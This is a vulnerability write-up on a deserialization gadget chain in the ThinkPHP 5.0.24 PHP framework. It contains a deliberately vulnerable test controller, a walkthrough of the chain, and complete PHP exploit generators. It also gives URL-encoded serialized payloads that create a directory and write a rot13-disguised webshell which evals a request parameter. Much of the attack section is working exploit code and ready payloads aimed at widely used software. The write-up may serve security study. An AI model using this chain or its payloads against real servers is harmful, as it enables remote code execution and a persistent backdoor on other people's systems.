# ThinkPHP5.0.x Deserialization

Author: H3rmesk1t

Data: 2021.08.19

# Vulnerability Environment
- Vulnerability testing environment: PHP5.6+ThinkPHP5.0.24
- Vulnerability Test Code application/index/controller/Index.php
```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
	    $Gyan = unserialize($_GET['d1no']);
    	var_dump($Gyan);
      return '<style type="text/css">*{ padding: 0; margin: 0; } .think_default_text{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"<h1>:)</h1><pThinkPHP V5<br/><span style="font-size:30px">Ten years of hard work - A high-performance framework designed for API development</span></p><span style="font-size:22px;">[ V5.0 version is exclusively sponsored by <a href="http://www.qiniu.com" target="qiniu">Qiu Cloud</a]</span></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="ad_bd568ce7058a1091"></think>';
    }
}
```
# Vulnerability Analysis
- Search the `__destruct` method globally
- Follow up on the `__destruct` method in `thinkphp/library/think/process/pipes/Windows.php` and found that it called the `removeFiles` method

<img src="https://pic.imgdb.cn/item/611ca40c4907e2d39c9900e0.png" alt="">

<img src="https://pic.imgdb.cn/item/611ca40c4907e2d39c9901ad.png" alt="">

- Follow up on `removeFiles` method
- You can use the `file_exists` function to trigger the `__toString` method of any class

<img src="https://pic.imgdb.cn/item/611ca5614907e2d39ca3ce57.png" alt="">

- Search the `__toString` method globally
- Follow up on the `__toString` method in `thinkphp/library/think/Model.php` and found that it called the `toJson` method

<img src="https://pic.imgdb.cn/item/611ca62c4907e2d39caa0984.png" alt="">

<img src="https://pic.imgdb.cn/item/611ca62c4907e2d39caa098e.png" alt="">

- Since the `toArray` method is called first in the return result of the `toJson` method, there are three places in the `toArray` method that can be triggered, using `$value->getAttr($attr)` to trigger

<img src="https://pic.imgdb.cn/item/611caa894907e2d39ccae4d0.png" alt="">

- If you want to continue to go down after going to else, you must first judge `$modelRelation`. The value of this variable comes from `$this->$relation()`, and then call the `Loader::parseName` method. This method needs to pass in the variable `$name` and continue to trace it up. Since `$this->append` is controllable, `$name` is also controllable. Here you can use the `getError` method in the `Model` class

<img src="https://pic.imgdb.cn/item/611cada04907e2d39ce066f2.png" alt="">

- Next, judge the value of `$value`, call the `getRelationData` method, pass in `$modelRelation`, and require the `Relation` type. After entering this method, make the `if` condition judgment first

```php
$this->parent && !$modelRelation->isSelfRelation() && get_class($modelRelation->getModel()) == get_class($this->parent)
```
- Follow up on the `isSelfRelation` method and the `getModel` method, and find that they are both controllable

<img src="https://pic.imgdb.cn/item/611caf644907e2d39cebc58a.png" alt="">

<img src="https://pic.imgdb.cn/item/611caf644907e2d39cebc599.png" alt="">

<img src="https://pic.imgdb.cn/item/611caf644907e2d39cebc5ac.png" alt="">

- Since the available `__call` method chooses the `think\console\Output` class, the previous `$value` must be the `think\console\Output` class object, so the `$this->parent` in the `getRelationData` method must be the `think\console\Output` class object, so the `think\console\Output` class object is definitely the `think\console\Output` class object
- The `get_class` method here requires that `$modelRelation->getModel()` and `$this->parent` are the same, that is, `$value` in `$value->getAttr($attr)` and the simple and controllable `model` above are the same, so that `$value` in `$value->getAttr($attr)` is controlled
- Continue to follow and check `$attr`, whose value is traced back to `$bindAttr = $modelRelation->getBindAttr();`, follow up `thinkphp/library/think/model/relation/OneToOne.php`, `binAttr` is controllable. At this point, the code can be executed to `$item[$key] = $value ? $value->getAttr($attr) : null;` to execute the `Output` class `__call` magic method

<img src="https://pic.imgdb.cn/item/611cb4364907e2d39c059602.png" alt="">

- Follow up on the `Output` class `block` method

<img src="https://pic.imgdb.cn/item/611cb4c34907e2d39c083122.png" alt="">

<img src="https://pic.imgdb.cn/item/611cb51e4907e2d39c09d107.png" alt="">

- Continue to follow up on the `writelin` method and find that the `write` method is called

<img src="https://pic.imgdb.cn/item/611d46d14907e2d39c203ceb.png" alt="">

- Here `$this->handle` is controllable, the global search `write` method is further utilized, follow up `thinkphp/library/think/session/driver/Memcached.php`

<img src="https://pic.imgdb.cn/item/611d47814907e2d39c220574.png" alt="">

- Continue search available `se
t` method, follow up `thinkphp/library/think/cache/driver/File.php`, you can directly execute the `file_put_contents` method to write `shell`, `$filename` is controllable and can be used to bypass death with pseudo-protocol `exit`


<img src="https://pic.imgdb.cn/item/611d47d34907e2d39c22d614.png" alt="">

- The `$data` value is tricky, because the parameters in the last call to the `set` method comes from the previously called `write` method can only be `true`, and here `$expire` can only be numeric values, so the file content cannot be written `shell`

<img src="https://pic.imgdb.cn/item/611d49004907e2d39c25c81b.png" alt="">

<img src="https://pic.imgdb.cn/item/611d49004907e2d39c25c834.png" alt="">

- Continue to execute, follow up on the `setTagItem` method below, and the `set` method will be executed again, and the file content here is `$value` assigned through `$name` (file name), so you can do something on the file name, for example

```php
php://filter/write=string.rot13/resource=./<?cuc cucvasb();?>
```

- Here we refer to the `POP chain structure diagram analyzed by osword master here`

<img src="https://pic.imgdb.cn/item/611d4a3c4907e2d39c28e08c.png" alt="">

# EXP
- Since `windows` has restrictions on file names and writes fail, the vulnerability cannot be reproduced in `windows` environment
```php
<?php
namespace think\process\pipes;
use think\model\Pivot;
class Pipes{

}

class Windows extends Pipes{
    private $files = [];

    function __construct(){
        $this->files = [new Pivot()];
    }
}

namespace think\model;#Relation
use think\db\Query;
abstract class Relation{
    protected $selfRelation;
    protected $query;
    function __construct(){
        $this->selfRelation = false;
        $this->query = new Query();#class Query
    }
}

namespace think\model\relation;#OneToOne HasOne
use think\model\Relation;
abstract class OneToOne extends Relation{
    function __construct(){
        parent::__construct();
    }

}
class HasOne extends OneToOne{
    protected $bindAttr = [];
    function __construct(){
        parent::__construct();
        $this->bindAttr = ["no","123"];
    }
}

namespace think\console;#Output
use think\session\driver\Memcached;
class Output{
    private $handle = null;
    protected $styles = [];
    function __construct(){
        $this->handle = new Memcached();//Purpose to call its write()
        $this->styles = ['getAttr'];
    }
}

namespace think;#Model
use think\model\relation\HasOne;
use think\console\Output;
use think\db\Query;
abstract class Model{
    protected $append = [];
    protected $error;
    public $parent;# modification location
    protected $selfRelation;
    protected $query;
    protected $aaaaa;

    function __construct(){
        $this->parent = new Output();#Output object, the purpose is to call __call()
        $this->append = ['getError'];
        $this->error = new HasOne();//Relation subclass, and getBindAttr()
        $this->selfRelation = false;//isSelfRelation()
        $this->query = new Query();

    }
}

namespace think\db;#Query
use think\console\Output;
class Query{
    protected $model;
    function __construct(){
        $this->model = new Output();
    }
}

namespace think\session\driver;#Memcached
use think\cache\driver\File;
class Memcached{
    protected $handler = null;
    function __construct(){
        $this->handler = new File();//Purpose call File->set()
    }
}
namespace think\cache\driver;#File
class File{
    protected $options = [];
    protected $tag;
    function __construct(){
        $this->options = [
        'expire' =0,
        'cache_subdir' =false,
        'prefix' ='',
        'path' ='php://filter/write=string.rot13/resource=./<?cuc cucvasb();riny($_TRG[q1ab])?>',
        'data_compress' =false,
        ];
        $this->tag = true;
    }
}

namespace think\model;
use think\Model;
class Pivot extends Model{


}
use think\process\pipes\Windows;
echo urlencode(serialize(new Windows()));
```
- Generate file name rules

```bash
md5('tag_'.md5($this->tag))
Right now:
md5('tag_c4ca4238a0b923820dcc509a6f75849b')
=>3b58a9545013e88c7186db11bb158c44
=>
<?cuc cucvasb();riny($_TRG[pzq]);?+ 3b58a9545013e88c7186db11bb158c44
Final file name:
<?cuc cucvasb();riny($_TRG[pzq]);?>3b58a9545013e88c7186db11bb158c44.php
```
- When exploiting vulnerabilities, you need to pay attention to the directory read and write permissions. You can first control `options['path'] = './demo/'`, and use the framework to create a `755` folder (provided that you have permissions). We can slightly modify the payload to create a directory with `0755` permissions (the `mkdir` function in `think\cache\driver\File:getCacheKey()` is used here), and then write files to this directory.
- poc create demo directory

```php
<?php
namespace think\process\pipes;
use think\model\Pivot;
class Pipes{

}

class Windows extends Pipes{
private $files = [];

    function __construct(){
        $this->files = [new Pivot()];
    }
}

namespace think\model;#Relation
use think\db\Query;
abstract class Relation{
    protected $selfRelation;
    protected $query;
    function __construct(){
        $this->selfRelation = false;
        $this->query = new Query();#class Query
    }
}

namespace think\model\relation;#OneToOne HasOne
use think\model\Relation;
abstract class OneToOne extends Relation{
    function __construct(){
        parent::__construct();
    }

}
class HasOne extends OneToOne{
    protected $bindAttr = [];
    function __construct(){
        parent::__construct();
        $this->bindAttr = ["no","123"];
    }
}

namespace think\console;#Output
use think\session\driver\Memcached;
class Output{
    private $handle = null;
    protected $styles = [];
    function __construct(){
        $this->handle = new Memcached();//Purpose to call its write()
        $this->styles = ['getAttr'];
    }
}

namespace think;#Model
use think\model\relation\HasOne;
use think\console\Output;
use think\db\Query;
abstract class Model{
    protected $append = [];
    protected $error;
    public $parent;# modification location
    protected $selfRelation;
    protected $query;
    protected $aaaaa;

    function __construct(){
        $this->parent = new Output();#Output object, the purpose is to call __call()
        $this->append = ['getError'];
        $this->error = new HasOne();//Relation subclass, and getBindAttr()
        $this->selfRelation = false;//isSelfRelation()
        $this->query = new Query();

    }
}

namespace think\db;#Query
use think\console\Output;
class Query{
    protected $model;
    function __construct(){
        $this->model = new Output();
    }
}

namespace think\session\driver;#Memcached
use think\cache\driver\File;
class Memcached{
    protected $handler = null;
    function __construct(){
        $this->handler = new File();//Purpose call File->set()
    }
}
namespace think\cache\driver;#File
class File{
    protected $options = [];
    protected $tag;
    function __construct(){
        $this->options = [
        'expire' =0,
        'cache_subdir' =false,
        'prefix' ='',
        'path' ='./demo/',
        'data_compress' =false,
        ];
        $this->tag = true;
    }
}

namespace think\model;
use think\Model;
class Pivot extends Model{


}
use think\process\pipes\Windows;
echo urlencode(serialize(new Windows()));
```
# Vulnerability reappears
- Create a demo directory first

```bash
[payload=](http://192.168.246.129/public/index.php?d1no=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%33 BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A6%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5 CHasOne%22%3A3%3A%7Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A2%3A%22no%22%3Bi%3A1%3Bs%3A3%3A%22123%22%3B%7Ds%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00que ry%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A% 22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%2 2expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A7%3A%22.%2Fdemo%2F%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6 %3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A %7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%2
2%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs% 3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A7%3A%22.%2Fdemo%2F%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds %3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7Ds%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00que ry%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00thin k%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5C cache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%% 3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A7%3A%22.%2Fdemo%2F%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00t ag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7Ds%3A8%3A%22%00%2A%00aaaa%22%3BN%3B%7D%7D%7D)
```
- Write files to this directory
```bash
[payload](http://192.168.246.129/public/index.php?d1no=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22% 3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A6%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%2 2%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A2%3A%22no%22%3Bi%3A1%3Bs%3A3%3A%22123%22%3B%7Ds%3A15% 3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5 COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A 23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%2 2prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A83%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.rot13%2Fresource%3D.%2Fdemo%2F%3C%3Fcuc+cucvasb%28%29%3Briny%28%24_TRG%5Bq 1ab%5D%29%3F%3E%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAtt r%22%3B%7D%7D%7D%7D%7Ds%3A6%3A%22parent%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession% 5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A %22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A83%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.rot 13%2Fresource%3D.%2Fdemo%2F%3C%3Fcuc+cucvasb%28%29%3Briny%28%24_TRG%5Bq1ab%5D%29%3F%3E%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D %7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7Ds%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%2 2think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3 A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22% 3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A83%3A%22php%3A%2F%2Ffilter%
2Fwrite%3Dstring.rot13%2Fresource%3D.%2Fdemo%2F%3C%3Fcuc+cucvasb%28%29%3Briny%28%24_TRG%5Bq1ab%5D%29%3F%3E%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A% 22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7Ds%3A8%3A%22%00%2A%00aaaa%22%3BN%3B%7D%7D%7D)
```
<img src="https://pic.imgdb.cn/item/611d63c84907e2d39c552b9e.png" alt="">

<img src="https://pic.imgdb.cn/item/611d63c84907e2d39c552ba4.png" alt="">